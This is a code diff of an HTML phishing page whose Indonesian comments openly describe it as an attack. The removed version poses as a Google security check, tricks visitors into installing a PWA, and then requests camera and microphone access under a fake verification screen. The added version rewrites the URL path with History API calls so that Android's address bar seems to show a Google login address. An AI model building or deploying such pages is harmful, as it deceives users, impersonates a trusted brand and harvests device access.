@@ -1,79 +1,40 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="manifest" href="manifest.json">
-    <title>Google Security Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
     <style>
-        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 15vh; margin: 0; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 18px 24px; font-size: 1.2em; border-radius: 8px; font-weight: bold; cursor: pointer; width: 85%; display: none; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
-        #loader { display: none; margin-top: 20vh; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #8ab4f8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { 
+            font-family: sans-serif; 
+            background: #202124; 
+            color: white; 
+            text-align: center; 
+            padding-top: 20vh; 
+        }
+        h2 { color: #8ab4f8; }
     </style>
 </head>
 <body>
 
-    <div id="install-ui">
-        <h2>Security Module Required</h2>
-        <p style="color:#9aa0a6; margin-bottom: 30px;">Verify your device to continue.</p>
-        <button class="btn" id="go">Install Verification Module</button>
-    </div>
+    <h2>System Secure</h2>
+    <p>Check your address bar right now.</p>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <h3 style="color:#8ab4f8;">Connecting to Secure Services...</h3>
-    </div>
-
-<script>
-// DAFTARKAN SERVICE WORKER
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('sw.js');
-}
-
-// LOGIKA SERANGAN
-const isStandalone = window.matchMedia('(display-mode: standalone)').matches || new URLSearchParams(window.location.search).get('mode') === 'pwa';
-
-if (isStandalone) {
-    // KITA BERADA DI DALAM PWA (Target Mode)
-    document.getElementById('install-ui').style.display = 'none';
-    document.getElementById('loader').style.display = 'block';
-
-    // Beri jeda 1 detik agar UI meyakinkan, lalu tembak Permission Kamera
-    setTimeout(() => {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then(stream => {
-                stream.getTracks().forEach(track => track.stop());
-                document.getElementById('loader').innerHTML = '<h3 style="color:#34a853;">Verification Complete.</h3><p>Hardware Access Confirmed.</p>';
-            })
-            .catch(err => {
-                document.getElementById('loader').innerHTML = '<h3 style="color:#ea4335;">Verification Failed.</h3><p>Permission Denied.</p>';
-            });
-    }, 1000);
-} else {
-    // KITA BERADA DI BROWSER BIASA (Setup Mode)
-    let deferredPrompt;
-
-    window.addEventListener('beforeinstallprompt', (e) => {
-        e.preventDefault();
-        deferredPrompt = e;
-        // Munculkan tombol install setelah PWA siap
-        document.getElementById('go').style.display = 'block';
-    });
-
-    document.getElementById('go').addEventListener('click', async () => {
-        if (deferredPrompt) {
-            deferredPrompt.prompt();
-            const { outcome } = await deferredPrompt.userChoice;
-            if (outcome === 'accepted') {
-                // Instruksi manipulatif agar korban langsung buka
-                document.getElementById('install-ui').innerHTML = '<h2>Installation Complete</h2><p style="color:#34a853;">Please return to your Home Screen and open the newly installed app.</p>';
-            }
-            deferredPrompt = null;
-        }
-    });
-}
-</script>
+    <script>
+        // THE KILL SHOT: Mengelabui Address Bar
+        // Kita menggunakan History API untuk memalsukan URL path
+        // Chrome mengizinkan ini selama masih di domain yang sama (ologoligature.github.io)
+        
+        window.onload = function() {
+            // String ajaib lu yang bikin engine font Android nge-glitch
+            const magicString = "googlelogoligature";
+            
+            // Kita inject string itu ke dalam URL secara instan
+            const spoofedPath = "/" + magicString + "/login-secure";
+            
+            // Eksekusi perubahan UI di Omnibox tanpa reload page
+            window.history.replaceState(null, "", spoofedPath);
+        };
+    </script>
 </body>
 </html>
